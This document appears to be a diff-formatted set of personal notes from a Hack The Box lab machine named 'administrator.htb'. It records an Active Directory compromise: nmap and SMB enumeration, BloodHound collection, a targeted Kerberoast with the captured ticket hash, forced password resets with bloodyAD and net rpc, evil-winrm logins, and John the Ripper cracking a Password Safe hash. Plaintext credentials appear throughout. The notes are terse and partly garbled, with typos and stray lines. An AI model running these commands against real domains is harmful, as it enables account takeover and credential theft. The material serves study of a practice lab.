@@ -1,0 +1,100 @@
+Username: Olivia 
+Password: ichliebedich
+
+└─$ nmap -A 10.10.11.42 -p 1-65535 -T4 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-20 18:47 CET
+Nmap scan report for 10.10.11.42
+Host is up (0.048s latency).
+Not shown: 65509 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-21 00:47:48Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+54242/tcp open  msrpc         Microsoft Windows RPC
+59699/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+59710/tcp open  msrpc         Microsoft Windows RPC
+59715/tcp open  msrpc         Microsoft Windows RPC
+59718/tcp open  msrpc         Microsoft Windows RPC
+59737/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-01-21T00:48:40
+|_  start_date: N/A
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.94 seconds
+
+
+└─$ crackmapexec smb 10.10.11.42 -u Olivia -p 'ichliebedich' --shares
+SMB         10.10.11.42     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
+SMB         10.10.11.42     445    DC               [+] Enumerated shares
+SMB         10.10.11.42     445    DC               Share           Permissions     Remark
+SMB         10.10.11.42     445    DC               -----           -----------     ------
+SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.42     445    DC               C$                              Default share
+SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share 
+
+
+
+netexec ldap 10.10.11.42 -u olivia -p ichliebedich  --bloodhound --collection All --dns-server 10.10.11.42 
+
+python3 /home/milo/Desktop/OffSec_narzedzia/BloodHound.py-bloodhound-ce/bloodhound.py -d administrator.htb -u olivia -p ichliebedich -c All -op default_kali_bloodhoundpy --zip  -ns 10.10.11.42
+
+timedatectl set-ntp off
+rdate -n [IP of Target]
+python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' --request-user 'michael' --dc-ip 10.10.11.42 
+
+
+$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$ca67577a360ab699f1e31761edacb724$909189be5d3c2c1e3e4799cbc3f286388570639dbaa973576527bbfcba59d732148d1c36ec7dc3f59e18754116b8a4667076ce79fb59e03ea5bb90f4295554bca5f8672af79cf5650e0861895e98fa7321832ae405d28f36e622a02ff5060a7c88c143e0f854597eea8716d4b265f306c5355f9b635e33f7ff5fff47e51a9eba69d2ad867cb027a9104ac36a3f740cf5e19f1f20bd35fa4d95b5281b12995243495973c49e79db9bec38e3725e68efa87094f4489565942179055b0f13b88eb5ed106237c5d83069ddc16058105f7700db563f7759c75b629040275fb06a35a26f00a7eacf221e8ee6df0c27859d0b1b617855cee8537263afcddb4d9288bcfaf5f783ea944e611e7f511b6342403b44e8b181c5b6c0ad97ad84a8711ef21fc709246566e55d3d1ca05d0f33cf65a6c81a89b4524c72c10c65b8dbb5ad58cc84f96283e3488a64954894fdbba6c3e63c15630ace75b3b38226a86e9994965501b75a82a2a97558695b42c4116736de1b24797eea123ad01760bc7f08d3f6e497f803dcd209c6bc21e291bc41a9f1912bf381107aa51aca9d5147178e0e8f54b94e31efb05953fe0548cc22d30e7304b46b40e5b33dbfa50ae191479bbf757af96aaf944f30ab9ba879f2c1b8f53ff354f47ebceaba0ffb9ad9646796f0bc6956c46ccd1d8a9ed51c243fa8a681bbfb5895273267b30c83647dfcc410d56b5da5061630560ca69d40cd3c92f4600ae6d4ec65ddaecb0475a5ece17f3437be89b29fd70fc20e41d28605cc065a6259aad44e8d3a2082a6abe80ec8ff06a4682b72102cf24ce98801dc9438563196a0b4388eb4f9d8c50184b520a7b173bf9f5c879ad6f458b4859c844d20a669ad8153500e56700645428b354d40ff66c4ddbb6b9be8cf083e99db17031cfe3bcf5f0387e019587810b8b31964c6b0b09fafd8491c116e10f2c7a8c59f5454e1412f7e8b50643c7b126181f41f51cfd9cb7a631a6302e6b5b97d68488425cdfd0f751d07d91ac091b90b5c127481f8b9c64cb1cc31e78c4ecd6d0fd22406fd82ac91989e4baaff25bf8383050f994593b6de827f97fb0390889edb5a1f857038a6d30192374f8844027f7fae77cba515bcd84de7c602a6e7b3d23883436a794d52aa7632b3178e0a222a847a8d75b5442abe7bd394dca0b1a449b3718040706c31b63b2253a77ea1779108582238e98f0f52fa0871ab8ce098a0804449bf91a84fa57b6a3ecafc316adb4a9b471cc1f1589410efccecfdb04f7f623150989ab8d13b233e094467b19e7c9aa6d2225b60508ef0c5474f74c647a5915a9594684a5297ddcfba88343c496b4a99907a595f712a0c7baabdfe4925cede33e1e1aa60bf8d9aa723218b831f4ba0556dd85e9f99a00bc301bf1a88ea30c69c65360f02803ea363b575b48043026c6b9565aa00318b9587afe5ba4a9af4ded0b70313d071bb6dfd040f96ba64ee8b449deaf34328f21d7549a45a27ca82db929efd4283b4f96666dfc6c11787a35bc4
+
+
+https://github.com/CravateRouge/bloodyAD
+bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p 'ichliebedich' set password michale 'Password123!'
+
+evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
+net user michael password1 /domain
+evil-winrm -i 10.10.11.42 -u 'michael' -p 'password1'
+net rpc password "benjamin" "newP@ssword2022" -U "administrator"/"michael"%"password1" -S "administrator.htb"
+crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'newP@ssword2022'
+ftp bajmain
+
+$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*524288*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
+
+john --wordlist=/usr/share/wordlists/rockyou.txt passafe1.txt 
+tekieromucho     (Backu) 
+
+emily 
+
+
